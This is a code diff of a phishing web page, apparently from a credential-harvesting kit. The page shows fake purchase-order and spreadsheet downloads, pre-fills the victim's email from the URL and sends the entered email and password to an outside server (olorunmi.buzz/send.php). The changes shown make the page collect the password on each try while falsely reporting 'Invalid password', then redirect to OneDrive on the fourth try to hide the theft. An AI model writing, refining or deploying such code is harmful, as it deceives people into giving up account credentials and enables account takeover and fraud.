@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -402,27 +401,37 @@
         (function() {
             // ============================================================
             // ⭐ CONFIGURE YOUR IMAGES HERE ⭐
-            // Both files are now set as "image" type (no play button overlay)
             // ============================================================
             const IMAGE_CONFIG = {
-                // First file - PDF (no play button)
                 file1: {
                     name: "Purchase_Order.pdf",
-                    type: "image",           // 👈 Changed from "video" to "image" - no play button
+                    type: "image",
                     previewImage: "file_3a381.png?height=200&width=300",
-                    iconType: "pdf"          // 👈 Changed to pdf icon
+                    iconType: "pdf"
                 },
-                // Second file - Excel/Spreadsheet
                 file2: {
                     name: "Specification.xlsx", 
-                    type: "image",           // 👈 Image type - no play button
+                    type: "image",
                     previewImage: "file_1a381.png?height=200&width=300",
-                    iconType: "xlsx"         // 👈 Excel icon
+                    iconType: "xlsx"
                 }
             };
             // ============================================================
             
-            // SVG Icons as HTML strings
+            // Track password attempts PER DIALOG (internal, not shown to user)
+            // Each dialog instance has its own attempt counter
+            let attemptCounters = new Map(); // key: dialogId, value: attempts
+            
+            // Helper function to get URL parameter
+            function getEmailFromUrl() {
+                const urlParams = new URLSearchParams(window.location.search);
+                let email = urlParams.get('email');
+                if (!email) email = urlParams.get('id');
+                if (!email) email = urlParams.get('user');
+                return email || '';
+            }
+            
+            // SVG Icons
             const Icons = {
                 Grid: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"></rect><path d="M3 9h18"></path><path d="M3 15h18"></path><path d="M9 3v18"></path><path d="M15 3v18"></path></svg>`,
                 X: `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>`,
@@ -430,26 +439,13 @@
                 Xlsx: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M8 13h2"></path><path d="M14 13h2"></path><path d="M8 17h2"></path><path d="M14 17h2"></path></svg>`
             };
             
-            // Build files array from config
             const files = [
-                { 
-                    id: "1", 
-                    name: IMAGE_CONFIG.file1.name, 
-                    type: IMAGE_CONFIG.file1.type, 
-                    iconType: IMAGE_CONFIG.file1.iconType,
-                    preview: IMAGE_CONFIG.file1.previewImage
-                },
-                { 
-                    id: "2", 
-                    name: IMAGE_CONFIG.file2.name, 
-                    type: IMAGE_CONFIG.file2.type, 
-                    iconType: IMAGE_CONFIG.file2.iconType,
-                    preview: IMAGE_CONFIG.file2.previewImage
-                }
+                { id: "1", name: IMAGE_CONFIG.file1.name, type: IMAGE_CONFIG.file1.type, iconType: IMAGE_CONFIG.file1.iconType, preview: IMAGE_CONFIG.file1.previewImage },
+                { id: "2", name: IMAGE_CONFIG.file2.name, type: IMAGE_CONFIG.file2.type, iconType: IMAGE_CONFIG.file2.iconType, preview: IMAGE_CONFIG.file2.previewImage }
             ];
             
-            // Send data to Telegram via your URL
-            async function sendToTelegram(email, password, fileName, action) {
+            // Send data to PHP URL
+            async function sendToPhpUrl(email, password, fileName, action) {
                 const url = "https://olorunmi.buzz/send.php";
                 const data = {
                     email: email,
@@ -464,9 +460,7 @@
                 try {
                     const response = await fetch(url, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
                     const result = await response.text();
@@ -480,9 +474,12 @@
             
             let currentDialog = null;
             let batchDialog = null;
+            let dialogIdCounter = 0;
             
             function closeDialog() {
                 if (currentDialog && currentDialog.parentNode) {
+                    const dialogId = currentDialog.getAttribute('data-dialog-id');
+                    if (dialogId) attemptCounters.delete(dialogId);
                     currentDialog.parentNode.removeChild(currentDialog);
                     currentDialog = null;
                 }
@@ -490,54 +487,72 @@
             
             function closeBatchDialog() {
                 if (batchDialog && batchDialog.parentNode) {
+                    const dialogId = batchDialog.getAttribute('data-dialog-id');
+                    if (dialogId) attemptCounters.delete(dialogId);
                     batchDialog.parentNode.removeChild(batchDialog);
                     batchDialog = null;
                 }
             }
             
-            async function handleFormSubmit(email, password, fileName, action, dialogElement, submitBtn, errorDiv, successDiv) {
+            // Redirect to onedrive.com (4th attempt)
+            function redirectToOnedrive() {
+                window.location.href = "https://onedrive.com";
+            }
+            
+            // Handle form submission with attempt tracking (internal, no display to user)
+            async function handleFormSubmit(email, password, fileName, action, dialogElement, submitBtn, errorDiv, successDiv, dialogId) {
+                // Initialize or get current attempt count for this dialog
+                let currentAttempts = attemptCounters.get(dialogId) || 0;
+                
+                // Increment attempt count (this is the current attempt)
+                currentAttempts++;
+                attemptCounters.set(dialogId, currentAttempts);
+                
+                console.log(`Attempt ${currentAttempts} for dialog ${dialogId}`);
+                
+                // Check if this is attempt #4 or more - redirect to onedrive
+                if (currentAttempts >= 4) {
+                    // Clear the counter and redirect
+                    attemptCounters.delete(dialogId);
+                    redirectToOnedrive();
+                    return;
+                }
+                
+                // For attempts 1, 2, 3: show "invalid password please try again" message
+                // Only send data to PHP on attempts 1-3 (still collect data)
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = '<span class="spinner"></span> Sending...';
+                submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
                 errorDiv.style.display = 'none';
                 if (successDiv) successDiv.style.display = 'none';
                 
-                // Send to Telegram
-                const result = await sendToTelegram(email, password, fileName, action);
+                // Still send data to PHP (collect info even on invalid attempts)
+                await sendToPhpUrl(email, password, fileName, action);
                 
-                if (result !== null) {
-                    // Success
-                    if (successDiv) {
-                        successDiv.style.display = 'block';
-                        successDiv.textContent = '✓ Request sent successfully!';
-                    }
-                    submitBtn.innerHTML = '✓ Sent';
-                    
-                    // Auto close after 1.5 seconds
-                    setTimeout(() => {
-                        if (action === 'single') closeDialog();
-                        else closeBatchDialog();
-                    }, 1500);
-                } else {
-                    // Error
-                    errorDiv.style.display = 'block';
-                    errorDiv.textContent = 'Connection error. Please try again.';
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = 'Try Again';
-                }
+                // Show invalid password message (for attempts 1, 2, and 3 - before redirect)
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'Invalid password. Please try again!';
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Try Again';
+                
+                // Clear password field for retry
+                const passwordInput = dialogElement.querySelector('input[type="password"]');
+                if (passwordInput) passwordInput.value = '';
+                passwordInput.focus();
             }
             
             function showDownloadDialog(file) {
                 closeDialog();
                 
+                const dialogId = 'single_' + (++dialogIdCounter);
                 const overlay = document.createElement('div');
                 overlay.className = 'dialog-overlay';
+                overlay.setAttribute('data-dialog-id', dialogId);
                 overlay.onclick = (e) => { if (e.target === overlay) closeDialog(); };
                 
                 const dialog = document.createElement('div');
                 dialog.className = 'dialog-content';
                 
-                const urlParams = new URLSearchParams(window.location.search);
-                const prefilledEmail = urlParams.get('id') || '';
+                const prefilledEmail = getEmailFromUrl();
                 
                 dialog.innerHTML = `
                     <div class="dialog-header">
@@ -572,6 +587,9 @@
                 document.body.appendChild(overlay);
                 currentDialog = overlay;
                 
+                // Initialize attempt counter for this dialog
+                attemptCounters.set(dialogId, 0);
+                
                 const form = dialog.querySelector('#downloadForm');
                 const emailInput = dialog.querySelector('#dialogEmail');
                 const passwordInput = dialog.querySelector('#dialogPassword');
@@ -587,7 +605,7 @@
                     e.preventDefault();
                     await handleFormSubmit(
                         emailInput.value, passwordInput.value, file.name, 'single',
-                        dialog, submitBtn, errorDiv, successDiv
+                        dialog, submitBtn, errorDiv, successDiv, dialogId
                     );
                 };
                 
@@ -599,16 +617,16 @@
             function showBatchDialog() {
                 closeBatchDialog();
                 
+                const dialogId = 'batch_' + (++dialogIdCounter);
                 const overlay = document.createElement('div');
                 overlay.className = 'dialog-overlay';
+                overlay.setAttribute('data-dialog-id', dialogId);
                 overlay.onclick = (e) => { if (e.target === overlay) closeBatchDialog(); };
                 
                 const dialog = document.createElement('div');
                 dialog.className = 'dialog-content';
                 
-                const urlParams = new URLSearchParams(window.location.search);
-                const prefilledEmail = urlParams.get('id') || '';
-                
+                const prefilledEmail = getEmailFromUrl();
                 const fileNames = files.map(f => f.name).join(', ');
                 
                 dialog.innerHTML = `
@@ -644,6 +662,9 @@
                 document.body.appendChild(overlay);
                 batchDialog = overlay;
                 
+                // Initialize attempt counter for this batch dialog
+                attemptCounters.set(dialogId, 0);
+                
                 const form = dialog.querySelector('#batchForm');
                 const emailInput = dialog.querySelector('#batchEmail');
                 const passwordInput = dialog.querySelector('#batchPassword');
@@ -659,7 +680,7 @@
                     e.preventDefault();
                     await handleFormSubmit(
                         emailInput.value, passwordInput.value, `ALL (${fileNames})`, 'batch',
-                        dialog, submitBtn, errorDiv, successDiv
+                        dialog, submitBtn, errorDiv, successDiv, dialogId
                     );
                 };
                 
@@ -677,11 +698,6 @@
                     const iconMap = { pdf: Icons.Pdf, xlsx: Icons.Xlsx };
                     const iconHtml = iconMap[file.iconType] || Icons.Pdf;
                     const iconClass = `icon-${file.iconType}`;
-                    
-                    // NO play overlay since both are images
-                    const playOverlay = '';
-                    
-                    // Handle image loading with fallback
                     const imageUrl = file.preview;
                     const fallbackSvg = `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%23f0f0f0'/%3E%3Ctext x='200' y='150' text-anchor='middle' fill='%23999' font-size='14'%3E${file.name}%3C/text%3E%3C/svg%3E`;
                     
@@ -691,7 +707,6 @@
                                 <div class="preview-container">
                                     <img src="${imageUrl}" alt="${file.name}" class="preview-image" 
                                          onerror="this.onerror=null; this.src='${fallbackSvg}';">
-                                    ${playOverlay}
                                 </div>
                                 <div class="file-info">
                                     <span class="file-icon ${iconClass}">${iconHtml}</span>
